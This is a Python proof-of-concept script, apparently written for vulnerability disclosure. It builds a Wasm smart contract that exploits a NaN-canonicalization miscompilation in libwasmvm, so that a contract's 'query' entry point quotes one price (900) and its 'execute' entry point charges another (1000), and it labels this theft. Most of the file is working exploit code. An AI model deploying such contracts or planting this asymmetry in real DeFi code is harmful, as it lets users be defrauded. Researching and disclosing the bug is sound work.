#!/usr/bin/env python3
"""
Is the NaN divergence *money*?  The quote/execute asymmetry.

The miscompilation makes the f64 NaN carried by an `if` with an **implicit**
else keep the raw hardware payload (x86-64: 0xFFF8000000000000) instead of the
canonical one (0x7FF8000000000000).  A contract can only *observe* that
difference with a bit-level test, because every value-level comparison
(`x == x`, `x.is_nan()`, `x < 0.0`) is NaN-agnostic.

Crucially, `select` (0x1B) is **not** a branch: it does not open a control
frame, so it does not go through `emit_return_values()` and therefore does not
canonicalize.  That makes the divergence observable *inside* the contract:

    nan  = sqrt(-1.0)
    if (param f64)(result f64) nan { }        ;; implicit else -> raw NaN
    bits = reinterpret_i64(nan)
    price = select(bits == 0xFFF8000000000000, 900, 1000)

This probe builds a contract with **two entry points that compute the same
thing with different code shapes**:

    query   -> the price the user is *quoted*   (uses the implicit else)
    execute -> the amount the chain *charges*   (uses the explicit else)

In a DeFi contract that is exactly the quote/execute pair of an AMM.  If the
two disagree, the user sees one price and pays another — on the same node, in
the same chain, with no chain split, no fork and no stake involved.

Measured on the production `.so`:

    query-implicit / execute-explicit -> quoted 900, charged 1000  <- theft
    query-implicit / execute-implicit -> quoted == charged          (control)
    query-explicit / execute-explicit -> quoted == charged          (control)
    query-explicit / execute-implicit -> quoted 1000, charged 900   (the reverse)

Usage:
    python3 nan_money_probe.py
"""

import os
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                        # noqa: E402
from wasm_builder import (                                 # noqa: E402
    F64, I32, I64, Module, op_call, op_else, op_end, op_f64_const_bits,
    op_f64_sqrt, op_if, op_i32_const, op_i32_store, op_i64_const,
    op_i64_eq, op_i64_reinterpret_f64, op_local_get, op_local_set, op_nop,
    op_select,
)

RESP_PTR = 16      # the Region descriptor
RESP_DATA = 64     # the 4-byte payload (the price)

# the raw NaN that x86-64 produces for sqrt(-1.0) ("real indefinite")
RAW_NAN = 0xFFF8000000000000
RAW_NAN_I64 = RAW_NAN - (1 << 64)      # as a signed i64 constant

# the two prices: what the victim is quoted and what the pool charges
PRICE_IF_RAW = 900       # the branch taken when the NaN is NOT canonical
PRICE_IF_CANON = 1000    # the branch taken when the NaN IS canonical


def calc_body(explicit_else, t_f64):
    """Computes the price and stores it at RESP_DATA.

    The logic is *identical* in both variants; only the shape of the `if`
    that carries the NaN changes.  That is the whole point: the source code
    is the same, only the compiler's choice differs.
    """
    b = bytearray()
    # nan = sqrt(-1.0)                       -> raw hardware NaN on x86-64
    b += op_f64_const_bits(struct.unpack("<Q", struct.pack("<d", -1.0))[0])
    b += op_f64_sqrt()
    # carry it through an `if` with a block parameter
    b += op_i32_const(0)                    # false arm: the one that leaks
    b += op_if(t_f64)                       # (param f64)(result f64)
    if explicit_else:
        b += op_else()
    b += op_end()
    # stack: [f64]
    b += op_i64_reinterpret_f64()            # [i64]
    b += op_i64_const(RAW_NAN_I64)          # [i64, i64]
    b += op_i64_eq()                        # [i32]  1 iff the NaN is the raw one
    b += op_local_set(1)                    # local 1 = the condition
    # price = select(cond, 900, 1000)  -- `select` opens no frame, so it does
    # not canonicalize: the raw NaN reaches the decision.
    # Wasm's `select` pops c, then val2, then val1 -> the stack is [val1,val2,c]
    b += op_i32_const(PRICE_IF_RAW)        # val1
    b += op_i32_const(PRICE_IF_CANON)      # val2
    b += op_local_get(1)                    # c
    b += op_select()                        # [i32]
    b += op_local_set(0)                    # local 0 = the price
    # publish it
    b += op_i32_const(RESP_DATA) + op_local_get(0) + op_i32_store()
    return bytes(b)


def build(query_explicit, execute_explicit):
    """A contract with a `query` and an `execute` entry point."""
    m = Module()
    t_f64 = m.add_type([F64], [F64])
    m.add_memory(4, export="memory")
    # Region { offset: 64, capacity: 8, length: 4 }
    m.add_data(RESP_PTR, RESP_DATA.to_bytes(4, "little") + (8).to_bytes(4, "little")
               + (4).to_bytes(4, "little"))
    m.add_data(RESP_DATA, b"\x00" * 8)
    # the allocator's Region: `allocate` returns 1024 and the host writes the
    # env/msg there
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))

    q = m.add_func([], [], locals=[I32, I32], body=calc_body(query_explicit, t_f64))
    e = m.add_func([], [], locals=[I32, I32], body=calc_body(execute_explicit, t_f64))

    # `query` takes (env_ptr, msg_ptr); `execute` takes (env, info, msg)
    m.add_func([I32, I32], [I32], body=op_call(q) + op_i32_const(RESP_PTR),
               export="query")
    m.add_func([I32, I32, I32], [I32], body=op_call(e) + op_i32_const(RESP_PTR),
               export="execute")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(RESP_PTR),
               export="instantiate")
    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def run(wasm):
    vm = R.VM()
    base = tempfile.mkdtemp(prefix="wasmvm-money-")
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, checksum, 1 << 62)

    out, rep, err = vm.query(cache, checksum, 1 << 62)
    if vm._vec_str(err):
        return None, None, vm._vec_str(err).strip().splitlines()[-1][:140]
    quoted = int.from_bytes(vm._vec_bytes(out)[:4], "little")

    out2, rep2, err2 = vm.execute(cache, checksum, 1 << 62)
    if vm._vec_str(err2):
        return None, None, vm._vec_str(err2).strip().splitlines()[-1][:140]
    charged = int.from_bytes(vm._vec_bytes(out2)[:4], "little")
    return quoted, charged, None


def main():
    print("¿La divergencia del NaN es dinero?  Cotizado (query) vs cobrado (execute)")
    print("libwasmvm: %s" % R.LIB)
    print("=" * 92)
    print("%-38s %-10s %-10s %-11s %s"
          % ("variante", "cotizado", "cobrado", "diferencia", "juicio"))
    print("-" * 92)

    # qexp/eexp: True = the `if` has an EXPLICIT else (canonicalizing),
    #            False = implicit else (the leaking one)
    cases = (
        ("query-implicit", "execute-explicit", False, True, True),
        ("query-implicit", "execute-implicit", False, False, False),
        ("query-explicit", "execute-explicit", True, True, False),
        ("query-explicit", "execute-implicit", True, False, True),
    )
    for qtag, etag, qexp, eexp, expect_gap in cases:
        quoted, charged, err = run(build(qexp, eexp))
        if err:
            print("%-38s ERROR %s" % (qtag, err))
            continue
        gap = charged - quoted
        ok = "ok" if (gap != 0) == expect_gap else "*** MAL ***"
        verdict = "la victima PAGA de mas" if gap > 0 else (
            "la victima PAGA de menos" if gap < 0 else "sin diferencia")
        print("%-38s %-10d %-10d %-11d %-22s %s"
              % ("%s / %s" % (qtag, etag), quoted, charged, gap, verdict, ok))

    print("-" * 92)
    print("El `query` es lo que el usuario ve (cotiza) y el `execute` es lo que la")
    print("cadena cobra.  Cuando las dos entry points usan formas distintas del")
    print("`if`, el precio cotizado y el cobrado DIFIEREN en el mismo nodo y en la")
    print("misma cadena: no hace falta particion, ni fork, ni stake.")


if __name__ == "__main__":
    main()
